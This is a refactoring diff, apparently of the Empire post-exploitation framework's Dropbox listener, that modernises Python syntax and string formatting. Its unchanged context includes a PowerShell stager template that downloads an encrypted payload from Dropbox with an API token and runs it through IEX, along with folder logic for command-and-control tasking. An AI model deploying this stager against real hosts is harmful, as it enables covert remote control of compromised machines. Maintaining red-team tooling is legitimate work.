@@ -3,7 +3,6 @@ import copy
 import logging
 import os
 import time
-from builtins import object, str
 from textwrap import dedent
 from typing import List, Optional, Tuple
 
@@ -20,8 +19,8 @@ LOG_NAME_PREFIX = __name__
 log = logging.getLogger(__name__)
 
 
-class Listener(object):
-    def __init__(self, mainMenu: MainMenu, params=[]):
+class Listener:
+    def __init__(self, mainMenu: MainMenu):
         self.info = {
             "Name": "Dropbox",
             "Authors": [
@@ -201,7 +200,7 @@ class Listener(object):
             launcher = listenerOptions["Launcher"]["Value"]
             api_token = listenerOptions["APIToken"]["Value"]
             baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
-            staging_folder = "/%s/%s" % (
+            staging_folder = "/{}/{}".format(
                 baseFolder,
                 listenerOptions["StagingFolder"]["Value"].strip("/"),
             )
@@ -269,14 +268,14 @@ class Listener(object):
                 stager += listener_util.powershell_rc4()
 
                 stager += dedent(
-                    f""" 
+                    f"""
                     # add in the Dropbox auth token and API params
                     $t='{ api_token }';
                     $wc.Headers.Add("Authorization","Bearer $t");
                     $wc.Headers.Add("Dropbox-API-Arg",\'{{"path":"{ staging_folder }/debugps"}}\');
                     $data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');
                     $iv=$data[0..3];$data=$data[4..$data.length];
-                    
+
                     # decode everything and kick it over to IEX to kick off execution
                     -join[Char[]](& $R $data ($IV+$K))|IEX
                     """
@@ -399,15 +398,15 @@ class Listener(object):
         profile = listenerOptions["DefaultProfile"]["Value"]
         workingHours = listenerOptions["WorkingHours"]["Value"]
         killDate = listenerOptions["KillDate"]["Value"]
-        stagingFolder = "/%s/%s" % (
+        stagingFolder = "/{}/{}".format(
             baseFolder,
             listenerOptions["StagingFolder"]["Value"].strip("/"),
         )
-        taskingsFolder = "/%s/%s" % (
+        taskingsFolder = "/{}/{}".format(
             baseFolder,
             listenerOptions["TaskingsFolder"]["Value"].strip("/"),
         )
-        resultsFolder = "/%s/%s" % (
+        resultsFolder = "/{}/{}".format(
             baseFolder,
             listenerOptions["ResultsFolder"]["Value"].strip("/"),
         )
@@ -607,11 +606,11 @@ class Listener(object):
         baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
         api_token = listenerOptions["APIToken"]["Value"]
 
-        taskingsFolder = "/%s/%s" % (
+        taskingsFolder = "/{}/{}".format(
             baseFolder,
             listenerOptions["TaskingsFolder"]["Value"].strip("/"),
         )
-        resultsFolder = "/%s/%s" % (
+        resultsFolder = "/{}/{}".format(
             baseFolder,
             listenerOptions["ResultsFolder"]["Value"].strip("/"),
         )
@@ -752,15 +751,15 @@ class Listener(object):
         api_token = listenerOptions["APIToken"]["Value"]
         listenerName = listenerOptions["Name"]["Value"]
         baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
-        stagingFolder = "/%s/%s" % (
+        stagingFolder = "/{}/{}".format(
             baseFolder,
             listenerOptions["StagingFolder"]["Value"].strip("/"),
         )
-        taskingsFolder = "/%s/%s" % (
+        taskingsFolder = "/{}/{}".format(
             baseFolder,
             listenerOptions["TaskingsFolder"]["Value"].strip("/"),
         )
-        resultsFolder = "/%s/%s" % (
+        resultsFolder = "/{}/{}".format(
             baseFolder,
             listenerOptions["ResultsFolder"]["Value"].strip("/"),
         )
@@ -844,7 +843,7 @@ class Listener(object):
                             stagingKey, stageData, listenerOptions
                         )
                         if dataResults and len(dataResults) > 0:
-                            for language, results in dataResults:
+                            for _language, results in dataResults:
                                 # TODO: more error checking
                                 try:
                                     dbx.files_delete(fileName)
@@ -853,10 +852,7 @@ class Listener(object):
                                     message = f"{listenerName}: Error deleting data at '{fileName}'"
                                     self.instance_log.error(message, exc_info=True)
                                 try:
-                                    stageName = "%s/%s_2.txt" % (
-                                        stagingFolder,
-                                        sessionID,
-                                    )
+                                    stageName = f"{stagingFolder}/{sessionID}_2.txt"
                                     listenerName = self.options["Name"]["Value"]
                                     message = f"Uploading key negotiation part 2 to {stageName} for {sessionID}"
                                     self.instance_log.info(message)
@@ -957,7 +953,7 @@ class Listener(object):
                 )
                 if taskingData:
                     try:
-                        taskingFile = "%s/%s.txt" % (taskingsFolder, sessionID)
+                        taskingFile = f"{taskingsFolder}/{sessionID}.txt"
 
                         # if the tasking file still exists, download/append + upload again
                         existingData = None
